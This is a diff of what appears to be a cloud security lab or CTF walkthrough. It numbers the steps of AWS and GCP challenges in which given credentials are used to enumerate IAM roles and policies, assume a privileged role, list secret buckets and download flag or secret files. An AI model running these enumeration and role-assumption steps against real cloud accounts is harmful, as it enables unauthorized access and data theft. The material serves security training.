@@ -141,12 +141,12 @@ pip install -r requirements.txt
 python enumerate-iam.py --access-key <AKIA....> --secret-key <15H72mm...>
 ```
 ## Trust Me, Relationship is Malicious
-### Configure AWS CLI with Given Credentials
+### 1. Configure AWS CLI with Given Credentials
 ```
 aws configure --profile IAM01
 aws sts get-caller-identity --profile IAM01
 ```
-### Hunt for Misconfigured IAM Roles
+### 2. Hunt for Misconfigured IAM Roles
 **Method 1: Using a Recon Tool**
 ```sh
 python assume_role_enum.py --account-id 058264439561 --profile IAM01
@@ -155,7 +155,7 @@ python assume_role_enum.py --account-id 058264439561 --profile IAM01
 ```sh
 aws sts assume-role --role-arn arn:aws:iam::058264439561:role/DBAdmin --role-session-name Role-Session --profile IAM01
 ```
-### Configure Temporary Credentials
+### 3. Configure Temporary Credentials
 ```sh
 aws configure set aws_access_key_id [key-id] --profile Role
 aws configure set aws_secret_access_key [key-id] --profile Role
@@ -163,7 +163,7 @@ aws configure set aws_session_token [token] --profile Role
 
 aws sts get-caller-identity --profile Role
 ```
-### Enumerate Permissions & Locate the Flag
+### 4. Enumerate Permissions & Locate the Flag
 ```
 #To list the permission attached to the Role
 aws iam list-attached-role-policies --role-name Manager_Role --profile Role
@@ -179,20 +179,20 @@ aws s3api get-object --bucket securecorpbakstoragebuk --key docs/Flag.txt flag.t
 
 ```
 ## IAM Access Compass (gcloud)
-### authenticate with the given credentials
+### 1. authenticate with the given credentials
 ```sh
 gcloud auth activate-service-account --key-file testing-srvacc-key.json
 ```
-### Getting Project Details
+### 2. Getting Project Details
 ```
 gcloud projects list
 ```
-### Getting Service Accounts
+### 3. Getting Service Accounts
 ```
 #To list the Service Accounts for specific project
 gcloud iam service-accounts list --project=woven-acolyte-428406-v9
 ```
-### Mapping the IAM Landscape
+### 4. Mapping the IAM Landscape
 ```
 #To list the policy binding (Custom roles)
 gcloud projects get-iam-policy woven-acolyte-428406-v9
@@ -206,7 +206,7 @@ gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].mem
 #To list all the roles
 gcloud iam roles list --project=woven-acolyte-428406-v9
 ```
-### Uncovering Hidden Secrets
+### 5. Uncovering Hidden Secrets
 ```
 #To get the bucket policy
 gcloud storage buckets get-iam-policy gs://secret-bucket-woven-acolyte-428406-v9
@@ -217,7 +217,7 @@ gsutil ls -r gs://secret-bucket-woven-acolyte-428406-v9
 #To download the file
 gsutil cp gs://secret-bucket-woven-acolyte-428406-v9/secret.txt .
 ```
-### Automated Tool - GCP Privilege Escalation Scanner
+### 6. Automated Tool - GCP Privilege Escalation Scanner
 ```sh
 git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
 cd .\GCP-IAM-Privilege-Escalation\
